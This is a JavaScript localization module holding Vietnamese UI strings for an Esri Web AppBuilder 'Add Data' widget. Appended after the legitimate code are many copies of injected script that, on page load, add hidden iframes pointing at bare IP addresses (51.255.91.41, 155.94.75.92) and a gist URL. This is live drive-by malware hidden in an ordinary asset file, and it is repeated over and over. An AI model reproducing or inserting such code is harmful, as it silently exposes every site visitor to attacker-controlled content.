// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/AddData/nls/strings":{_widgetLabel:"Th\u00eam D\u1eef li\u1ec7u",noOptionsConfigured:"Kh\u00f4ng c\u00f3 t\u00f9y ch\u1ecdn n\u00e0o \u0111\u01b0\u1ee3c c\u1ea5u h\u00ecnh.",tabs:{search:"T\u00ecm ki\u1ebfm",url:"URL",file:"T\u1ec7p"},search:{featureLayerTitlePattern:"{serviceName} - {layerName}",layerInaccessible:"Kh\u00f4ng th\u1ec3 truy c\u1eadp l\u1edbp.",loadError:"AddData, kh\u00f4ng th\u1ec3 t\u1ea3i:",searchBox:{search:"T\u00ecm ki\u1ebfm",placeholder:"T\u00ecm ki\u1ebfm..."},
bboxOption:{bbox:"Trong b\u1ea3n \u0111\u1ed3"},scopeOptions:{anonymousContent:"N\u1ed9i dung",myContent:"N\u1ed9i dung c\u1ee7a t\u00f4i",myOrganization:"T\u1ed5 ch\u1ee9c c\u1ee7a t\u00f4i",curated:"\u0110\u01b0\u1ee3c gi\u00e1m s\u00e1t",ArcGISOnline:"ArcGIS Online"},sortOptions:{prompt:"S\u1eafp x\u1ebfp theo:",relevance:"Li\u00ean quan",title:"Ti\u00eau \u0111\u1ec1",owner:"Ch\u1ee7 s\u1edf h\u1eefu",rating:"X\u1ebfp lo\u1ea1i",views:"L\u01b0\u1ee3t xem",date:"Ng\u00e0y",switchOrder:"Chuy\u1ec3n \u0111\u1ed5i"},
typeOptions:{prompt:"Lo\u1ea1i",mapService:"D\u1ecbch v\u1ee5 B\u1ea3n \u0111\u1ed3",featureService:"D\u1ecbch v\u1ee5 \u0110\u1ed1i t\u01b0\u1ee3ng",imageService:"D\u1ecbch v\u1ee5 H\u00ecnh \u1ea3nh",vectorTileService:"D\u1ecbch v\u1ee5 Tile V\u00e9c t\u01a1",kml:"KML",wms:"WMS"},resultsPane:{noMatch:"Kh\u00f4ng t\u00ecm th\u1ea5y k\u1ebft qu\u1ea3 n\u00e0o."},paging:{first:"\x3c\x3c",firstTip:"\u0110\u1ea7u ti\u00ean",previous:"\x3c",previousTip:"Tr\u01b0\u1edbc",next:"\x3e",nextTip:"Ti\u1ebfp theo",
pagePattern:"{page}"},resultCount:{countPattern:"{count} {type}",itemSingular:"M\u1ee5c",itemPlural:"M\u1ee5c"},item:{actions:{add:"Th\u00eam",close:"\u0110\u00f3ng",remove:"X\u00f3a",details:"Chi ti\u1ebft",done:"Ho\u00e0n t\u1ea5t",editName:"Ch\u1ec9nh s\u1eeda T\u00ean"},messages:{adding:"\u0110ang th\u00eam...",removing:"\u0110ang x\u00f3a...",added:"\u0110\u00e3 th\u00eam",addFailed:"Kh\u00f4ng th\u1ec3 th\u00eam",unsupported:"Kh\u00f4ng \u0111\u01b0\u1ee3c h\u1ed7 tr\u1ee3"},typeByOwnerPattern:"{type} b\u1edfi {owner}",
dateFormat:"d MMMM, yyyy",datePattern:"{date}",ratingsCommentsViewsPattern:"{ratings} {ratingsIcon} {comments} {commentsIcon} {views} {viewsIcon}",ratingsCommentsViewsLabels:{ratings:'l\u01b0\u1ee3t x\u1ebfp h\u1ea1ng", "l\u01b0\u1ee3t nh\u1eadn x\u00e9t": "l\u01b0\u1ee3t nh\u1eadn x\u00e9t", "l\u01b0\u1ee3t xem": "l\u01b0\u1ee3t xem'},types:{"Map Service":"D\u1ecbch v\u1ee5 B\u1ea3n \u0111\u1ed3","Feature Service":"D\u1ecbch v\u1ee5 \u0110\u1ed1i t\u01b0\u1ee3ng","Image Service":"D\u1ecbch v\u1ee5 H\u00ecnh \u1ea3nh",
"Vector Tile Service":"D\u1ecbch v\u1ee5 Tile V\u00e9c t\u01a1",WMS:"WMS",KML:"KML"}}},addFromUrl:{type:"Lo\u1ea1i",url:"URL",types:{ArcGIS:"M\u1ed9t D\u1ecbch v\u1ee5 Web c\u1ee7a ArcGIS Server",WMS:"M\u1ed9t D\u1ecbch v\u1ee5 Web WMS OGC",WMTS:"M\u1ed9t D\u1ecbch v\u1ee5 Web WMTS OGC",WFS:"D\u1ecbch v\u1ee5 Web WMS OGC",KML:"M\u1ed9t T\u1ec7p KML",GeoRSS:"M\u1ed9t T\u1ec7p GeoRSS",CSV:"M\u1ed9t T\u1ec7p CSV"},samplesHint:"(C\u00e1c) URL M\u1eabu"},addFromFile:{intro:"B\u1ea1n c\u00f3 th\u1ec3 th\u1ea3 ho\u1eb7c duy\u1ec7t cho m\u1ed9t lo\u1ea1i t\u1ec7p d\u01b0\u1edbi \u0111\u00e2y:",
types:{Shapefile:"Shapefile (.zip, t\u1ec7p l\u01b0u tr\u1eef ZIP c\u00f3 ch\u1ee9a t\u1ea5t c\u1ea3 c\u00e1c t\u1ec7p shapefile)",CSV:"T\u1ec7p CSV (.csv, c\u00f3 \u0111\u1ecba ch\u1ec9 ho\u1eb7c kinh \u0111\u1ed9, v\u0129 \u0111\u1ed9, \u0111\u01b0\u1ee3c ng\u0103n c\u00e1ch b\u1eb1ng d\u1ea5u ph\u1ea9y, d\u1ea5u ch\u1ea5m ph\u1ea9y ho\u1eb7c tab)",KML:"T\u1ec7p KML (.kml)",GPX:"T\u1ec7p GPX (.gpx, \u0110\u1ecbnh d\u1ea1ng Trao \u0111\u1ed5i GPS)",GeoJSON:"T\u1ec7p GeoJSON (.geo.json ho\u1eb7c .geojson)"},
generalizeOn:"T\u1ed5ng qu\u00e1t h\u00f3a c\u00e1c \u0111\u1ed1i t\u01b0\u1ee3ng \u0111\u1ec3 hi\u1ec3n th\u1ecb web",dropOrBrowse:"Th\u1ea3 ho\u1eb7c Duy\u1ec7t",browse:"Duy\u1ec7t",invalidType:"Lo\u1ea1i t\u1ec7p n\u00e0y kh\u00f4ng \u0111\u01b0\u1ee3c h\u1ed7 tr\u1ee3.",addingPattern:"{filename}: \u0111ang th\u00eam...",addFailedPattern:"{filename}: th\u00eam th\u1ea5t b\u1ea1i",featureCountPattern:"{filename}: {count} (c\u00e1c) \u0111\u1ed1i t\u01b0\u1ee3ng",invalidTypePattern:"{filename}: lo\u1ea1i n\u00e0y kh\u00f4ng \u0111\u01b0\u1ee3c h\u1ed7 tr\u1ee3",
maxFeaturesAllowedPattern:"Cho ph\u00e9p t\u1ed1i \u0111a {count} \u0111\u1ed1i t\u01b0\u1ee3ng",layerNamePattern:"{filename} - {name}"},layerList:{caption:"L\u1edbp",noLayersAdded:"Kh\u00f4ng c\u00f3 l\u1edbp n\u00e0o \u0111\u01b0\u1ee3c th\u00eam.",removeLayer:"G\u1ee1 b\u1ecf L\u1edbp",back:"Quay l\u1ea1i"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});